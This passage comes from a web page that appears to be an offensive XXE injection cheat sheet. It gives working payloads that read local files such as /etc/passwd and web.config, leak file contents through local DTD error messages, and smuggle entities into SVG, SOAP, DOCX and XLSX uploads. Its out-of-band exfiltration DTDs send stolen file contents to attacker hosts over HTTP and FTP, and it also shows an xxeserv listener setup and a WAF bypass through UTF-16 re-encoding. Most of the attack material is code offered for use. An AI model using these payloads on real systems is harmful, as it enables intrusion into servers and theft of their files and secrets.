</span></span></span><span style=display:flex><span><span style=color:#75715e>    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///C:\Windows\System32\wbem\xml\cim20.dtd&#34;&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;!ENTITY % SuperClass &#39;&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file://D:\webserv2\services\web.config&#34;&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://t/#&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
</span></span><span style=display:flex><span>        &amp;#x25;eval;
</span></span><span style=display:flex><span>        &amp;#x25;error;
</span></span><span style=display:flex><span>      <span style=color:#75715e>&lt;!ENTITY test &#34;test&#34;&#39;
</span></span></span><span style=display:flex><span><span style=color:#75715e>    &gt;</span>
</span></span><span style=display:flex><span>    %local_dtd;
</span></span><span style=display:flex><span>  ]&gt;<span style=color:#f92672>&lt;xxx&gt;</span>cacat<span style=color:#f92672>&lt;/xxx&gt;</span>
</span></span></code></pre></div><h3 id=disclose-http-response>Disclose HTTP Response:
<a class=anchor href=#disclose-http-response>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE doc [
</span></span></span><span style=display:flex><span><span style=color:#75715e>    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///C:\Windows\System32\wbem\xml\cim20.dtd&#34;&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;!ENTITY % SuperClass &#39;&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>&lt;!ENTITY &amp;#x25; file SYSTEM &#34;https://erp.company.com&#34;&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://test/#&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
</span></span><span style=display:flex><span>        &amp;#x25;eval;
</span></span><span style=display:flex><span>        &amp;#x25;error;
</span></span><span style=display:flex><span>      <span style=color:#75715e>&lt;!ENTITY test &#34;test&#34;&#39;
</span></span></span><span style=display:flex><span><span style=color:#75715e>    &gt;</span>
</span></span><span style=display:flex><span>    %local_dtd;
</span></span><span style=display:flex><span>  ]&gt;<span style=color:#f92672>&lt;xxx&gt;</span>cacat<span style=color:#f92672>&lt;/xxx&gt;</span>
</span></span></code></pre></div><h2 id=xxe-in-exotic-files>XXE in exotic files
<a class=anchor href=#xxe-in-exotic-files>#</a></h2><h3 id=xxe-inside-svg>XXE inside SVG
<a class=anchor href=#xxe-inside-svg>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;svg</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://www.w3.org/2000/svg&#34;</span> <span style=color:#a6e22e>xmlns:xlink=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xlink&#34;</span> <span style=color:#a6e22e>width=</span><span style=color:#e6db74>&#34;300&#34;</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;1.1&#34;</span> <span style=color:#a6e22e>height=</span><span style=color:#e6db74>&#34;200&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;image</span> <span style=color:#a6e22e>xlink:href=</span><span style=color:#e6db74>&#34;expect://ls&#34;</span> <span style=color:#a6e22e>width=</span><span style=color:#e6db74>&#34;200&#34;</span> <span style=color:#a6e22e>height=</span><span style=color:#e6db74>&#34;200&#34;</span><span style=color:#f92672>&gt;&lt;/image&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/svg&gt;</span>
</span></span></code></pre></div><p><strong>Classic</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt;</span> ]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;svg</span> <span style=color:#a6e22e>width=</span><span style=color:#e6db74>&#34;128px&#34;</span> <span style=color:#a6e22e>height=</span><span style=color:#e6db74>&#34;128px&#34;</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://www.w3.org/2000/svg&#34;</span> <span style=color:#a6e22e>xmlns:xlink=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xlink&#34;</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;1.1&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;text</span> <span style=color:#a6e22e>font-size=</span><span style=color:#e6db74>&#34;16&#34;</span> <span style=color:#a6e22e>x=</span><span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>y=</span><span style=color:#e6db74>&#34;16&#34;</span><span style=color:#f92672>&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/text&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/svg&gt;</span>
</span></span></code></pre></div><p><strong>OOB via SVG rasterization</strong></p><p><em>xxe.svg</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE svg [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ELEMENT svg ANY &gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % sp SYSTEM &#34;http://example.org:8080/xxe.xml&#34;&gt;</span>
</span></span><span style=display:flex><span>%sp;
</span></span><span style=display:flex><span>%param1;
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;svg</span> <span style=color:#a6e22e>viewBox=</span><span style=color:#e6db74>&#34;0 0 200 200&#34;</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;1.2&#34;</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://www.w3.org/2000/svg&#34;</span> <span style=color:#a6e22e>style=</span><span style=color:#e6db74>&#34;fill:red&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;text</span> <span style=color:#a6e22e>x=</span><span style=color:#e6db74>&#34;15&#34;</span> <span style=color:#a6e22e>y=</span><span style=color:#e6db74>&#34;100&#34;</span> <span style=color:#a6e22e>style=</span><span style=color:#e6db74>&#34;fill:black&#34;</span><span style=color:#f92672>&gt;</span>XXE via SVG rasterization<span style=color:#f92672>&lt;/text&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;rect</span> <span style=color:#a6e22e>x=</span><span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>y=</span><span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>rx=</span><span style=color:#e6db74>&#34;10&#34;</span> <span style=color:#a6e22e>ry=</span><span style=color:#e6db74>&#34;10&#34;</span> <span style=color:#a6e22e>width=</span><span style=color:#e6db74>&#34;200&#34;</span> <span style=color:#a6e22e>height=</span><span style=color:#e6db74>&#34;200&#34;</span> <span style=color:#a6e22e>style=</span><span style=color:#e6db74>&#34;fill:pink;opacity:0.7&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;flowRoot</span> <span style=color:#a6e22e>font-size=</span><span style=color:#e6db74>&#34;15&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>         <span style=color:#f92672>&lt;flowRegion&gt;</span>
</span></span><span style=display:flex><span>           <span style=color:#f92672>&lt;rect</span> <span style=color:#a6e22e>x=</span><span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>y=</span><span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>width=</span><span style=color:#e6db74>&#34;200&#34;</span> <span style=color:#a6e22e>height=</span><span style=color:#e6db74>&#34;200&#34;</span> <span style=color:#a6e22e>style=</span><span style=color:#e6db74>&#34;fill:red;opacity:0.3&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>         <span style=color:#f92672>&lt;/flowRegion&gt;</span>
</span></span><span style=display:flex><span>         <span style=color:#f92672>&lt;flowDiv&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;flowPara&gt;</span>&amp;exfil;<span style=color:#f92672>&lt;/flowPara&gt;</span>
</span></span><span style=display:flex><span>         <span style=color:#f92672>&lt;/flowDiv&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;/flowRoot&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/svg&gt;</span>
</span></span></code></pre></div><p><em>xxe.xml</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % data SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/hostname&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % param1 &#34;&lt;!ENTITY exfil SYSTEM &#39;ftp://example.org:2121/%data;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></div><h3 id=xxe-inside-soap>XXE inside SOAP
<a class=anchor href=#xxe-inside-soap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;soap:Body&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;foo&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &#34;http://x.x.x.x:22/&#34;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/foo&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/soap:Body&gt;</span>
</span></span></code></pre></div><h3 id=xxe-inside-docx-file>XXE inside DOCX file
<a class=anchor href=#xxe-inside-docx-file>#</a></h3><p>Format of an Open XML file (inject the payload in any .xml file):</p><ul><li>/_rels/.rels</li><li>[Content_Types].xml</li><li>Default Main Document Part<ul><li>/word/document.xml</li><li>/ppt/presentation.xml</li><li>/xl/workbook.xml</li></ul></li></ul><p>Then update the file <code>zip -u xxe.docx [Content_Types].xml</code></p><p>Tool : <a href=https://github.com/BuffaloWill/oxml_xxe>https://github.com/BuffaloWill/oxml_xxe</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>DOCX/XLSX/PPTX
</span></span><span style=display:flex><span>ODT/ODG/ODP/ODS
</span></span><span style=display:flex><span>SVG
</span></span><span style=display:flex><span>XML
</span></span><span style=display:flex><span>PDF <span style=color:#f92672>(</span>experimental<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>JPG <span style=color:#f92672>(</span>experimental<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>GIF <span style=color:#f92672>(</span>experimental<span style=color:#f92672>)</span>
</span></span></code></pre></div><h3 id=xxe-inside-xlsx-file>XXE inside XLSX file
<a class=anchor href=#xxe-inside-xlsx-file>#</a></h3><p>Structure of the XLSX:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ 7z l xxe.xlsx
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   Date      Time    Attr         Size   Compressed  Name
</span></span><span style=display:flex><span>------------------- ----- ------------ ------------  ------------------------
</span></span><span style=display:flex><span>2021-10-17 15:19:00 .....          <span style=color:#ae81ff>578</span>          <span style=color:#ae81ff>223</span>  _rels/.rels
</span></span><span style=display:flex><span>2021-10-17 15:19:00 .....          <span style=color:#ae81ff>887</span>          <span style=color:#ae81ff>508</span>  xl/workbook.xml
</span></span><span style=display:flex><span>2021-10-17 15:19:00 .....         <span style=color:#ae81ff>4451</span>          <span style=color:#ae81ff>643</span>  xl/styles.xml
</span></span><span style=display:flex><span>2021-10-17 15:19:00 .....         <span style=color:#ae81ff>2042</span>          <span style=color:#ae81ff>899</span>  xl/worksheets/sheet1.xml
</span></span><span style=display:flex><span>2021-10-17 15:19:00 .....          <span style=color:#ae81ff>549</span>          <span style=color:#ae81ff>210</span>  xl/_rels/workbook.xml.rels
</span></span><span style=display:flex><span>2021-10-17 15:19:00 .....          <span style=color:#ae81ff>201</span>          <span style=color:#ae81ff>160</span>  xl/sharedStrings.xml
</span></span><span style=display:flex><span>2021-10-17 15:19:00 .....          <span style=color:#ae81ff>731</span>          <span style=color:#ae81ff>352</span>  docProps/core.xml
</span></span><span style=display:flex><span>2021-10-17 15:19:00 .....          <span style=color:#ae81ff>410</span>          <span style=color:#ae81ff>246</span>  docProps/app.xml
</span></span><span style=display:flex><span>2021-10-17 15:19:00 .....         <span style=color:#ae81ff>1367</span>          <span style=color:#ae81ff>345</span>  <span style=color:#f92672>[</span>Content_Types<span style=color:#f92672>]</span>.xml
</span></span><span style=display:flex><span>------------------- ----- ------------ ------------  ------------------------
</span></span><span style=display:flex><span>2021-10-17 15:19:00              <span style=color:#ae81ff>11216</span>         <span style=color:#ae81ff>3586</span>  <span style=color:#ae81ff>9</span> files
</span></span></code></pre></div><p>Extract Excel file: <code>7z x -oXXE xxe.xlsx</code></p><p>Rebuild Excel file:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cd XXE
</span></span><span style=display:flex><span>$ 7z u ../xxe.xlsx *
</span></span></code></pre></div><p>Add your blind XXE payload inside <code>xl/workbook.xml</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE cdl [&lt;!ELEMENT cdl ANY &gt;&lt;!ENTITY % asd SYSTEM &#34;http://x.x.x.x:8000/xxe.dtd&#34;&gt;</span>%asd;%c;]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;cdl&gt;</span>&amp;rrr;<span style=color:#f92672>&lt;/cdl&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;workbook</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://schemas.openxmlformats.org/spreadsheetml/2006/main&#34;</span> <span style=color:#a6e22e>xmlns:r=</span><span style=color:#e6db74>&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships&#34;</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p>Alternativly, add your payload in <code>xl/sharedStrings.xml</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE cdl [&lt;!ELEMENT t ANY &gt;&lt;!ENTITY % asd SYSTEM &#34;http://x.x.x.x:8000/xxe.dtd&#34;&gt;</span>%asd;%c;]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;sst</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://schemas.openxmlformats.org/spreadsheetml/2006/main&#34;</span> <span style=color:#a6e22e>count=</span><span style=color:#e6db74>&#34;10&#34;</span> <span style=color:#a6e22e>uniqueCount=</span><span style=color:#e6db74>&#34;10&#34;</span><span style=color:#f92672>&gt;&lt;si&gt;&lt;t&gt;</span>&amp;rrr;<span style=color:#f92672>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA2<span style=color:#f92672>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA3<span style=color:#f92672>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA4<span style=color:#f92672>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA5<span style=color:#f92672>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB1<span style=color:#f92672>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB2<span style=color:#f92672>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB3<span style=color:#f92672>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB4<span style=color:#f92672>&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB5<span style=color:#f92672>&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;</span>
</span></span></code></pre></div><p>Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file.
Instead we build the document once and then change the DTD.
And using FTP instead of HTTP allows to retrieve much larger files.</p><p><code>xxe.dtd</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % d SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % c &#34;&lt;!ENTITY rrr SYSTEM &#39;ftp://x.x.x.x:2121/%d;&#39;&gt;</span>&#34;&gt; 
</span></span></code></pre></div><p>Serve DTD and receive FTP payload using <a href=https://github.com/staaldraad/xxeserv>xxeserv</a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ xxeserv -o files.log -p <span style=color:#ae81ff>2121</span> -w -wd public -wp <span style=color:#ae81ff>8000</span>
</span></span></code></pre></div><h3 id=xxe-inside-dtd-file>XXE inside DTD file
<a class=anchor href=#xxe-inside-dtd-file>#</a></h3><p>Most XXE payloads detailed above require control over both the DTD or <code>DOCTYPE</code> block as well as the <code>xml</code> file.
In rare situations, you may only control the DTD file and won&rsquo;t be able to modify the <code>xml</code> file. For example, a MITM.
When all you control is the DTD file, and you do not control the <code>xml</code> file, XXE may still be possible with this payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!-- Load the contents of a sensitive file into a variable --&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % payload SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- Use that variable to construct an HTTP get request with the file contents in the URL --&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % param1 &#39;&lt;!ENTITY &amp;#37; external SYSTEM &#34;http://my.evil-host.com/x=%payload;&#34;&gt;</span>&#39;&gt;
</span></span><span style=display:flex><span>%param1;
</span></span><span style=display:flex><span>%external;
</span></span></code></pre></div><h3 id=xxe-waf-bypass-via-convert-character-encoding>XXE WAF Bypass via convert character encoding
<a class=anchor href=#xxe-waf-bypass-via-convert-character-encoding>#</a></h3><p>In XXE WAFs, DTD Prolog are usually blacklisted BUT not all WAFs blacklist the UTF-16 character encoding<br><br><code>All XML processors must accept the UTF-8 and UTF-16 encodings of Unicode</code>
&ndash; <a href=https://www.w3.org/XML/xml-V10-4e-errata#E11>https://www.w3.org/XML/xml-V10-4e-errata#E11</a><br><br>we can convert the character encoding to <code>UTF-16</code> using <a href=https://man7.org/linux/man-pages/man1/iconv.1.html>iconv</a> to bypass the XXE WAF:-<br></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE &gt; utf16exploit.xml
</span></span></code></pre></div><h2 id=references>References
<a class=anchor href=#references>#</a></h2><ul><li><a href=https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing>XML External Entity (XXE) Processing - OWASP</a></li><li><a href=http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html>Detecting and exploiting XXE in SAML Interfaces</a> - 6. Nov. 2014 - Von Christian Mainka</li><li><a href=https://gist.github.com/staaldraad/01415b990939494879b4>[Gist] staaldraad - XXE payloads</a></li><li><a href=https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870>[Gist] mgeeky - XML attacks</a></li><li><a href=https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf>Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @<em>will_is</em></a></li><li><a href=http://en.hackdig.com/08/28075.htm>XXE ALL THE THINGS!!! (including Apple iOS&rsquo;s Office Viewer)</a></li><li><a href=https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/>From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele</a></li><li><a href=https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/>How we got read access on Google’s production servers</a> April 11, 2014 by detectify</li><li><a href=http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html>Blind OOB XXE At UBER 26+ Domains Hacked</a> August 05, 2016 by Raghav Bisht</li><li><a href=https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf>OOB XXE through SAML</a> by Sean Melia @seanmeals</li><li><a href=https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html>XXE in Uber to read local files</a> 01/2017</li><li><a href=https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/>XXE inside SVG</a> JUNE 22, 2016 by YEO QUAN YANG</li><li><a href=https://phonexicum.github.io/infosec/xxe.html>Pentest XXE - @phonexicum</a></li><li><a href=https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/>Exploiting XXE with local DTD files</a> - 12/12/2018 - Arseniy Sharoglazov</li><li><a href=https://portswigger.net/web-security/xxe>Web Security Academy &#187; XML external entity (XXE) injection - 2019 PortSwigger Ltd</a></li><li><a href=https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation>Automating local DTD discovery for XXE exploitation</a> - July 16 2019 by Philippe Arteau</li><li><a href=https://www.4armed.com/blog/exploiting-xxe-with-excel/>EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN</a></li><li><a href=https://github.com/jmcnamara/excel-reader-xlsx/issues/10>excel-reader-xlsx #10</a></li><li><a href=https://jbz.team/midnightsunctfquals2019/Rubenscube>Midnight Sun CTF 2019 Quals - Rubenscube</a></li><li><a href=https://www.synack.com/blog/a-deep-dive-into-xxe-injection/>SynAck - A Deep Dive into XXE Injection</a> - 22 July 2019 - Trenton Gordon</li><li><a href=https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf>Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server</a> - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK</li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/m00tiny/grayhatfreelancing/commit/75f0a66614fa426f8abba2c6d831f05bf85bfab5 title='Last modified by Stuart Gray | January 27, 2023' target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
<span>January 27, 2023</span></a></div></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#xml-external-entity>XML External Entity</a><ul><li><a href=#tools>Tools</a></li><li><a href=#detect-the-vulnerability>Detect the vulnerability</a></li><li><a href=#exploiting-xxe-to-retrieve-files>Exploiting XXE to retrieve files</a><ul><li><a href=#classic-xxe>Classic XXE</a></li><li><a href=#classic-xxe-base64-encoded>Classic XXE Base64 encoded</a></li><li><a href=#php-wrapper-inside-xxe>PHP Wrapper inside XXE</a></li><li><a href=#xinclude-attacks>XInclude attacks</a></li></ul></li><li><a href=#exploiting-xxe-to-perform-ssrf-attacks>Exploiting XXE to perform SSRF attacks</a></li><li><a href=#exploiting-xxe-to-perform-a-deny-of-service>Exploiting XXE to perform a deny of service</a><ul><li><a href=#billion-laugh-attack>Billion Laugh Attack</a></li><li><a href=#yaml-attack>Yaml attack</a></li></ul></li><li><a href=#error-based-xxe>Error Based XXE</a></li><li><a href=#exploiting-blind-xxe-to-exfiltrate-data-out-of-band>Exploiting blind XXE to exfiltrate data out-of-band</a><ul><li><a href=#blind-xxe>Blind XXE</a></li><li><a href=#xxe-oob-attack>XXE OOB Attack</a></li><li><a href=#xxe-oob-with-dtd-and-php-filter>XXE OOB with DTD and PHP filter</a></li><li><a href=#xxe-oob-with-apache-karaf>XXE OOB with Apache Karaf</a></li></ul></li><li><a href=#xxe-with-local-dtd>XXE with local DTD</a></li><li><a href=#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents>Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents</a><ul><li><a href=#disclose-local-file>Disclose local file</a></li><li><a href=#disclose-http-response>Disclose HTTP Response:</a></li></ul></li><li><a href=#xxe-in-exotic-files>XXE in exotic files</a><ul><li><a href=#xxe-inside-svg>XXE inside SVG</a></li><li><a href=#xxe-inside-soap>XXE inside SOAP</a></li><li><a href=#xxe-inside-docx-file>XXE inside DOCX file</a></li><li><a href=#xxe-inside-xlsx-file>XXE inside XLSX file</a></li><li><a href=#xxe-inside-dtd-file>XXE inside DTD file</a></li><li><a href=#xxe-waf-bypass-via-convert-character-encoding>XXE WAF Bypass via convert character encoding</a></li></ul></li><li><a href=#references>References</a></li></ul></li></ul></nav></div></aside></main></body></html>